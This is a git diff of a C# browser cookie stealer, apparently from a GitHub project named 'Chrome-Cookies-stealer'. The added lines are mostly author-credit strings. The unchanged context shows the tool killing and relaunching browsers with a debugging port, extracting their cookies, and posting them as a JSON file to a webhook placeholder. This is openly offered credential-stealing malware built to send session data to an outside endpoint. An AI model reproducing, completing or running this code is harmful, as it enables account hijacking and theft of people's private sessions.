@@ -1,3 +1,11 @@
+// By CyrilSou 
+
+// GITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer
+
+// DO NOT USE WITHOUT CREDIT ME AND PLEASE STARS
+
+
+
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
@@ -34,7 +42,7 @@ public class Program
             var config = CONFIGS[browser];
             if (File.Exists(config.bin))
             {
-                Console.WriteLine($"Attempting to retrieve cookies for {browser}...");
+                Console.WriteLine($"Attempting to retrieve cookies for {browser}... \n\nBy CyrilSou\n\nGITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer \n\n DO NOT USE WITHOUT CREDIT ME AND PLEASE STARS");
                 CloseBrowser(config.bin);
                 StartBrowser(config.bin, config.user_data);
                 await Task.Delay(5000); // Wait for the browser to start and open the debugging port
@@ -52,7 +60,7 @@ public class Program
             }
             else
             {
-                Console.WriteLine($"{browser} not found on this system.");
+                Console.WriteLine($"{browser} not found on this system.\n\nBy CyrilSou\n\nGITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer \n\n DO NOT USE WITHOUT CREDIT ME AND PLEASE STARS");
             }
         }
     }
@@ -71,11 +79,11 @@ public class Program
                 }
                 catch (HttpRequestException)
                 {
-                    Console.WriteLine("Debugging port not available yet, retrying...");
+                    Console.WriteLine("Debugging port not available yet, retrying...\n\nBy CyrilSou\n\nGITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer \n\n DO NOT USE WITHOUT CREDIT ME AND PLEASE STARS");
                     await Task.Delay(2000); // Wait for 2 seconds before retrying
                 }
             }
-            throw new Exception("Unable to connect to debugging port after multiple retries.");
+            throw new Exception("Unable to connect to debugging port after multiple retries.\n\nBy CyrilSou\n\nGITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer \n\n DO NOT USE WITHOUT CREDIT ME AND PLEASE STARS");
         }
     }
 
@@ -147,7 +155,8 @@ public class Program
             var fileContent = new ByteArrayContent(System.Text.Encoding.UTF8.GetBytes(cookies.ToString(Newtonsoft.Json.Formatting.Indented)));
             fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
             form.Add(fileContent, "file", $"cookies_{browser}.json");
-
+// By CyrilSou
+// GITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer
             var response = await client.PostAsync("Your Webhook", form);
 
             if (response.IsSuccessStatusCode)
@@ -161,3 +170,6 @@ public class Program
         }
     }
 }
+
+// By CyrilSou 
+// GITHUB : https://github.com/Cyrilsou/Chrome-Cookies-stealer
